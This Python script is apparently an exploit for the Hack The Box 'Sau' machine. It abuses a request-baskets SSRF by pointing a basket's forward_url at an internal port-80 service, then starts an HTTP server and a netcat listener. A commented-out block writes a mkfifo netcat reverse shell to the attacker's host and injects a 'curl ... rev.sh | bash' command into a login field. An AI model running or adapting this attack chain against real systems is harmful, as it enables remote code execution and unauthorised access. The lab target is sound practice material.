import atexit
import string
import random
import subprocess
import requests
import signal
import sys
import os
import threading
import time
import argparse
import shutil
from pwn import log, listen

parser = argparse.ArgumentParser(description="Programa para configurar conexiones.")
parser.add_argument('-rhost', '--remote-host', dest='victim_ip', required=True, help="Ip of the sau machiene.")
parser.add_argument('-lhost', '--local-hot', dest='attacker_ip', required=True, help="Your ip.")
parser.add_argument('-lport', '--local-port', dest='attacker_port', type=int, required=True,
                    help="Port for your nc listener.")
args = parser.parse_args()

victim = args.victim_ip
attacker = args.attacker_ip
nc_port = args.attacker_port

sau_web_service_port = "55555"
localhost = "127.0.0.1"
url_vulnerable_service = f"http://{victim}:{sau_web_service_port}/"
ssrf_url = f"http://{victim}:{sau_web_service_port}/api/baskets/"
ssrf_payload = f"http://{localhost}:80/"  # According to nmap port 80 is filtered. That means the firewall is blocking por 80. Which means it could be some web service.

range_basket_name = 10
http_server = None


def kill_processes():
    if http_server and http_server.poll() is None:
        time.sleep(2)
        http_server.terminate()
        http_server.wait()


def exit_handler(signum, frame):
    sys.exit(1)


def check_vpn_connection(target_ip):
    # progress_controller("Checking connection", )
    p = log.progress("Connection")
    p.status("Checking connection to HTB VPN")

    time.sleep(2)
    try:
        subprocess.run(["ping", "-c", "1", target_ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        p.success("Target [" + target_ip + "] reachable. Connection successfully checked.")
    except subprocess.CalledProcessError as e:
        print("Target [" + target_ip + "] unreachable. Make sure you are connected to Hack the Box VPN.")
        sys.exit(1)


def check_python_version():
    p = log.progress("Python")
    p.status("Checking python system version")

    time.sleep(2)
    status = " version found"
    if shutil.which("python3"):
        p.success("python3" + status)
        return "python3"
    elif shutil.which("python"):
        p.success("python" + status)
        return "python"


def start_http_server(python_version):
    global http_server

    p = log.progress("Server")
    p.status("poping simple http server")

    try:
        http_server = subprocess.Popen(["python3", "-m", "http.server", "8003"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        p.success("Server started successfully")
    except subprocess.CalledProcessError as e:
        print("Error a la hora de iniciar el servidor " + e)
        sys.exit(1)


def get_rce():
    # choose from all lowercase letter
    letters = string.ascii_lowercase
    basket_name = ''.join(random.choice(letters) for i in range(range_basket_name))

    # We need to provide to the fordward_url the ip we want to call.
    data = {
        "forward_url": f"{ssrf_payload}",
        "proxy_response": True,
        "insecure_tls": False,
        "expand_path": True,
        "capacity": 250
    }

    try:
        r = requests.request(method="POST", url=ssrf_url + basket_name, json=data)
        r.raise_for_status()
    except requests.exceptions.Timeout:
        print(
            "Request timed out. The server didn't respond within the specified time. Make sure you are connected to the vpn.")
    except requests.exceptions.RequestException as e:
        print("An error occurred:", e)

    if r.status_code == 201:
        res = requests.request(method="GET", url=url_vulnerable_service + basket_name)

        if res.status_code == 200:
            try:
                subprocess.Popen(["nc", "-lvnp", str(nc_port)])
            except FileNotFoundError:
                print("Netcat (nc) is not installed or not in the PATH.")



# if r.status_code == 201:
#
# if r.status_code == 200:
# print(f"Web service found inside {victim} -> {localhost}:80")
#
# nc_thread = threading.Thread(target=os.system, args=[f"nc -lvnp {nc_port}"])
# nc_thread.start()
# nc_thread.join(timeout=1)
#
# server_thread = threading.Thread(target=os.system, args=[f"python -m http.server 8003"])
# server_thread.start()
#
# time.sleep(1)
#
# os.system(f"echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {attacker} {nc_port} >/tmp/f' > rev.sh | chmod +x rev.sh")
# attack_thread = threading.Thread(target=os.system, args=[f"curl {url_vulnerable_service}{basket_name}/login --data 'username=;`curl http://{attacker}:8003/rev.sh | bash`'"])
# attack_thread.start()
# print("Trying to explote...")
#
# attack_thread.join(timeout=10)
#
# os.system("kill $(lsof -i :8003 | grep LISTEN | awk '{print $2}')")
# os.system("rm rev.sh")

if __name__ == '__main__':
    # Program flow control
    atexit.register(kill_processes)
    signal.signal(signal.SIGINT, exit_handler)

    # Check vpn connection - check if the target is available to connect
    check_vpn_connection(victim)

    # Check python version
    python_version = check_python_version()

    # Start the server
    start_http_server(python_version)

    # start the connection
    get_rce()
